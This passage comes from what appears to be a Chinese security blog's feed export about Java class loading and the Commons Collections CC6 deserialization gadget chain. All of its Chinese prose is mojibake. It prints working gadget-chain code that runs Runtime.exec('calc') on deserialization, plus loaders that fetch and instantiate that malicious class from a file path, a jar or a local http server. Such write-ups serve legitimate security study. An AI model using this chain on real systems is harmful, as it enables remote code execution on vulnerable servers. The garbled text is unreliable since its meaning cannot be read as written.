è½½è¿‡ã€‚</li></ul><p>Class.forName()<strong>è¿™ä¸ªæ–¹æ³•åªèƒ½åˆ›å»ºç¨‹åºä¸­å·²ç»å¼•ç”¨çš„ç±»ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦åŠ¨æ€åŠ è½½ç¨‹åºå¤–çš„ç±»ï¼ŒClass.forName()æ˜¯ä¸å¤Ÿçš„</strong>ï¼Œè¿™ä¸ªæ—¶å€™å°±æ˜¯éœ€è¦ä½¿ç”¨URLClassLoaderçš„æ—¶å€™ã€‚</p><p>å› ä¸ºnewInstance()æ˜¯è°ƒç”¨æ— å‚æ„é€ å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥æ”¹æ¶æ„ä»£ç åˆ°æ„é€ å‡½æ•°å†…ï¼Œä¹Ÿå¯ä»¥å†™åˆ°é™æ€ä»£ç å—æˆ–è€…æ„é€ ä»£ç å—ã€‚</p><p>æŠŠCC6æ”¹ä¸ªæ„é€ å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6TiedMapEntry</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CC6TiedMapEntry</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;godown&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="fileåè®®"><a href="#fileåè®®" class="headerlink" title="fileåè®®"></a>fileåè®®</h3><p>æ„å»ºåæ”¾åˆ°æŒ‡å®šçš„é¡¹ç›®å¤–ç›®å½•ï¼Œæµ‹è¯•åŠ è½½é¡¹ç›®å¤–è·¯å¾„çš„ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731151651287.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731151651287.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŠŠé¡¹ç›®æ–‡ä»¶ä¸‹çš„CC6TiedMapEntryæ–‡ä»¶åˆ å»</p><p>ç”¨ä¸‹åˆ—ä»£ç å°±èƒ½è¿œç¨‹åŠ è½½ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:///E:\\CODE_COLLECT\\&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; clazz = urlClassLoader.loadClass(<span class="string">&quot;CC6TiedMapEntry&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731153412148.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731153412148.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="jaråè®®"><a href="#jaråè®®" class="headerlink" title="jaråè®®"></a>jaråè®®</h3><p>ä¸Šé¢çš„ä»£ç ç”¨çš„fileåè®®ï¼Œå®é™…ä¸Šjaråè®®å’Œhttpåè®®ä¹Ÿå¯ä»¥åŠ è½½ï¼š</p><p>å…ˆåˆ›å»ºå·¥ä»¶ï¼Œç„¶åæŠŠCC6TiedMapEntry.classåŠ å…¥jaråŒ…ä¸‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731154736468.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731154736468.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ„å»ºå·¥ä»¶</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731154821585.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731154821585.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŒç†ï¼Œä¼ åˆ°ç›®å½•ä¸‹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731154904750.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731154904750.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;jar:file:///E:\\CODE_COLLECT\\CC6TiedMapEntry.jar!/&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; clazz = urlClassLoader.loadClass(<span class="string">&quot;CC6TiedMapEntry&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨ä¸Šè¿°ä»£ç è¿›è¡ŒåŠ è½½ï¼Œä¹Ÿæ˜¯æˆåŠŸåŠ è½½ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731154932573.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731154932573.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="httpåè®®"><a href="#httpåè®®" class="headerlink" title="httpåè®®"></a>httpåè®®</h3><p>httpå°±å¾ˆç®€å•äº†ï¼Œpythonå¼€ä¸ªæœåŠ¡ç›´æ¥è¯·æ±‚ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731162405290.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731162405290.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:9999/&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; clazz = urlClassLoader.loadClass(<span class="string">&quot;CC6TiedMapEntry&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥httpæ­é…fileå’Œjaråè®®ä½¿ç”¨ï¼Œè‡ªè¡Œå‘æŒ¥å§ã€‚</p><h2 id="æºç è¯¦è§£"><a href="#æºç è¯¦è§£" class="headerlink" title="æºç è¯¦è§£"></a>æºç è¯¦è§£</h2><p>é™¤æ­¤ä»¥å¤–è¿˜æœ‰ä¸€ç§æ›´åº•å±‚çš„ä»£ç è¿›è¡Œç±»åŠ è½½ã€‚æˆ‘ä»¬æ·±å…¥åˆ†æä¸€ä¸‹ä¸‹åˆ—ä»£ç æ˜¯æ€ä¹ˆåŠ è½½ç±»çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    ClassLoader classLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">    Class&lt;?&gt; clazz = classLoader.loadClass(&quot;org.example.CC6TiedMapEntry&quot;);</span><br><span class="line">    clazz.newInstance();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ClassLoader.getSystemClassLoader()è¿”å›çš„æ˜¯ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªLauncher$AppClassLoader çš„å®ä¾‹</p></blockquote><p>æˆ‘ä»¬æŒ‡å®šçš„ç±»å…ˆè¿›å…¥å•å‚æ•°çš„ClassLoader#loadClassï¼Œå› ä¸ºAppClassLoaderï¼Œçˆ¶ç±»URLClassLoaderåŠå…¶çˆ¶ç±»SecureClassLoaderé‡Œå¹¶æ²¡æœ‰å•å‚æ•°loadClassï¼Œä½†æ˜¯SecureClassLoaderç»§æ‰¿äº†ClassLoader</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731173028112.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731173028112.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯¥loadClassè°ƒç”¨äº†å¦ä¸€ä¸ªåŒå‚æ•°çš„loadClassï¼Œå°½ç®¡ClassLoaderå®ç°äº†è¿™ä¸ªåŒå‚æ•°çš„loadClassï¼Œä½†æ ¹æ®å¤šæ€æ€§åŸåˆ™ï¼Œè¿˜æ˜¯äº¤ç»™é‡è½½äº†è¯¥æ–¹æ³•çš„å­ç±»AppClassLoaderè¿è¡Œã€‚</p><p>åœ¨AppClassLoaderä¸­è°ƒç”¨äº†çˆ¶ç±»çš„loadClassï¼Œä¹Ÿå°±æ˜¯ClassLoaderçš„loadClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731175928852.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731175928852.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>äºæ˜¯å¼€å§‹åŒäº²å§”æ´¾</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731180116014.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731180116014.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”±äºä¸åœ¨æŒ‡å®šçš„ç›®å½•ä¸‹ï¼ŒBootstrapLoaderå’ŒExtClassLoaderéƒ½åŠ è½½ä¸äº†ï¼Œæœ€åä¼ å›äº†AppClassLoaderã€‚</p><p>AppClassLoader#findClassä¸å­˜åœ¨ï¼Œäº¤ç”±å…¶çˆ¶ç±»URLClassLoader#findClasså¤„ç†ã€‚</p><p>äºæ˜¯åœ¨è¯¥æ–¹æ³•ä¸­ï¼Œè·å–äº†ç±»è·¯å¾„ï¼Œå¹¶è°ƒç”¨defineClassåŠ è½½å­—èŠ‚ç </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731180720964.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731180720964.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿè¿›defineClassï¼Œå‘ç°å®é™…ä¸Šæ˜¯è°ƒç”¨äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731180820380.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731180820380.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨ClassLoader#defineClassè¿›è¡Œäº†å­—èŠ‚ç çš„åŠ è½½ï¼Œå…·ä½“çš„å®ç°åœ¨defineClass1è¿™ä¸ªC++å®ç°æ–¹æ³•ä¸­ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731181000728.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731181000728.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸ªè¿‡ç¨‹ä¸éœ€è¦è®°ä½ï¼Œåªéœ€è¦çŸ¥é“æœ€ååœ¨ClassLoader#defineClassè¿›è¡Œå­—èŠ‚ç çš„åŠ è½½</p><p>è°ƒç”¨è¿‡ç¨‹ï¼šAppClassLoader#loadClass-&gt;ClassLoader#loadClass-&gt;åŒäº²å§”æ´¾-&gt;AppClassLoader#findClass(æ— )-&gt;URLClassLoader#findClass-&gt;URLClassLoader#defineClass-&gt;ClassLoader#defineClass</p><p>åŒäº²å§”æ´¾è¿‡ç¨‹ï¼šæ£€æŸ¥æ˜¯å¦åŠ è½½è¿‡-&gt;ExtClassLoader#loadClass-&gt;BootstrapClassLoader-&gt;AppClassLoader#findClass</p><h2 id="defineClassåº•å±‚åŠ è½½"><a href="#defineClassåº•å±‚åŠ è½½" class="headerlink" title="defineClassåº•å±‚åŠ è½½"></a>defineClassåº•å±‚åŠ è½½</h2><p>æ—¢ç„¶æœ€åç±»åŠ è½½çš„åœ°æ–¹æ˜¯defineClassï¼Œé‚£æˆ‘ä»¬åå°„ç›´æ¥è°ƒç”¨ä¸€éè¯¥æ–¹æ³•æµ‹è¯•ä¸€ä¸‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731182329733.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731182329733.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class&lt;ClassLoader&gt; cl = ClassLoader.class;</span><br><span class="line">    <span class="type">Method</span> <span class="variable">defineclassmethod</span> <span class="operator">=</span> cl.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">    defineclassmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\CC6TiedMapEntry.class&quot;</span>));</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cc6Instance</span> <span class="operator">=</span> (Class) defineclassmethod.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;CC6TiedMapEntry&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">    cc6Instance.newInstance();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731183540038.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731183540038.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯è§ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨defineClassåŠ è½½ç±»ã€‚</p><p>å°½ç®¡defineClassæ˜¯protected finalï¼Œå…¶ä»–åœ°æ–¹ä¾ç„¶æœ‰è°ƒç”¨åˆ°è¯¥æ–¹æ³•ï¼Œè®©æˆ‘ä»¬å¯ä»¥æ„é€ åº•å±‚çš„æ¶æ„ç±»åŠ è½½æ”»å‡»ã€‚</p><p>æ¯”å¦‚bcelï¼ŒTemplatesImpl</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731190735428.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240731190735428.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> javaæ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç±»åŠ è½½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCé‡å¯ä¹‹ç±»URLDNSçš„CC6</title>
      <link href="/2024/07/20/lei-urldns-de-cc6/"/>
      <url>/2024/07/20/lei-urldns-de-cc6/</url>
      
        <content type="html"><![CDATA[<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« çš„åˆ†æä¸­</p><p><a href="https://godownio.github.io/2024/07/13/cc-chong-qi-zhi-ji-yu-dong-tai-dai-li-gou-zao-de-lazymap-ban-cc1/">https://godownio.github.io/2024/07/13/cc-chong-qi-zhi-ji-yu-dong-tai-dai-li-gou-zao-de-lazymap-ban-cc1/</a></p><p>æœ€åæåˆ°å› ä¸ºsun.reflect.annotation.AnnotationInvocationHandleråœ¨jdk8u71ç‰ˆæœ¬çš„ä¿®å¤ï¼ŒTransformedMapå’ŒLazyMapæ„é€ çš„CC1åœ¨jdk8u71åŠä¹‹åéƒ½ä¸èƒ½ä½¿ç”¨äº†ã€‚</p><p>é‚£æˆ‘ä»¬å°è¯•æ„é€ ä¸€ä¸ªåªä¾èµ–Common collectionsçš„é“¾ï¼Œæ— é¡»ä½¿ç”¨jdkè‡ªå¸¦çš„åŒ…ï¼Œè¿™æ ·åªè¦Common collectionså¤„äºæ¼æ´ç‰ˆæœ¬ï¼ˆ&lt;&#x3D;3.2.1ï¼‰ï¼Œé‚£å°±å¯ä»¥è¿›è¡Œæ”»å‡»ã€‚</p><p>ç°åœ¨æˆ‘ä»¬æŠ›å¼ƒsunåŒ…ä¸‹çš„ç±»è¿›è¡Œæ„é€ ï¼Œå›æƒ³æˆ‘ä»¬ä¹‹å‰è¯´åˆ°çš„æœ‰å¾ˆå¤šåœ°æ–¹éƒ½è°ƒç”¨äº†getæ–¹æ³•ï¼ŒLazyMapçš„getåˆä½•å¿…éè¦ç”¨AnnotationInvocationHandler.invokeå»è§¦å‘ã€‚</p><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p>å®˜æ–¹CC6ç»™å‡ºçš„ä¸‹ä¸€ä¸ªè°ƒç”¨æ˜¯TiedMapEntry#getValue()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717202349580.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717202349580.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŒæ—¶æ³¨æ„åˆ°TiedMapEntryæœ‰hashCodeå‡½æ•°ï¼Œè€Œä¸”åœ¨hashCodeä¸­è°ƒç”¨äº†getValue</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717202754178.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717202754178.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹ä»£ç è§¦å‘ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title 